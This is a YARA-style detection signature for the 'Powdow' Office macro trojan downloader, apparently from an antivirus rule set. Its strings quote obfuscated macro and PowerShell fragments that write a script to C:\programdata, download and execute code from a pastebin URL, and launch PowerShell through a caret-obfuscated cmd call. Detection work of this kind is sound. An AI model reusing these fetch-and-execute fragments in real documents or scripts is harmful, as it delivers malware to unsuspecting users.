
rule TrojanDownloader_O97M_Powdow_PRC_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.PRC!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 "
		
	strings :
		$a_01_0 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 63 72 69 70 74 69 6e 67 2e 46 69 6c 65 53 79 73 74 65 6d 4f 62 6a 65 63 74 22 29 } //1 = CreateObject("Scripting.FileSystemObject")
		$a_01_1 = {6f 62 6a 46 53 4f 2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 43 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c 6f 6b 2e 70 73 31 22 29 } //1 objFSO.CreateTextFile("C:\programdata\ok.ps1")
		$a_01_2 = {4f 62 6a 46 69 6c 65 2e 57 72 69 74 65 20 28 22 28 2e 28 27 4e 65 27 2b 28 27 77 2d 27 2b 27 4f 62 27 29 2b 28 27 6a 27 2b 27 65 63 74 27 29 29 } //1 ObjFile.Write ("(.('Ne'+('w-'+'Ob')+('j'+'ect'))
		$a_01_3 = {6e 60 45 74 2e 77 60 45 42 60 43 4c 69 65 4e 74 29 2e 22 22 44 4f 77 60 4e 4c 60 4f 61 64 73 60 54 52 49 60 4e 67 22 22 28 28 27 68 74 27 2b 27 74 70 73 27 2b 27 3a 2f 2f 70 61 73 74 65 62 69 6e 2e 63 6f 6d 2f 72 61 77 27 2b 27 2f 27 2b 27 57 4e 4a 27 2b 27 44 27 2b 27 35 58 27 2b 27 52 27 2b 27 76 27 29 29 7c 2e 28 20 } //1 n`Et.w`EB`CLieNt).""DOw`NL`Oads`TRI`Ng""(('ht'+'tps'+'://pastebin.com/raw'+'/'+'WNJ'+'D'+'5X'+'R'+'v'))|.( 
		$a_01_4 = {28 5b 53 74 72 69 6e 67 5d 27 27 2e 22 22 69 53 6e 60 4f 52 4d 60 41 6c 49 5a 65 64 22 22 29 5b 35 2c 33 36 2c 34 38 5d 2d 4a 6f 69 6e 27 27 29 22 29 } //1 ([String]''.""iSn`ORM`AlIZed"")[5,36,48]-Join'')")
		$a_01_5 = {3d 45 58 45 43 28 22 22 63 6d 64 20 2f 63 20 70 5e 6f 77 65 72 73 68 5e 65 6c 5e 6c 20 43 3a 5c 50 72 6f 67 72 61 6d 64 61 74 61 5c 6f 6b 2e 70 73 31 22 } //1 =EXEC(""cmd /c p^owersh^el^l C:\Programdata\ok.ps1"
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=6
 
}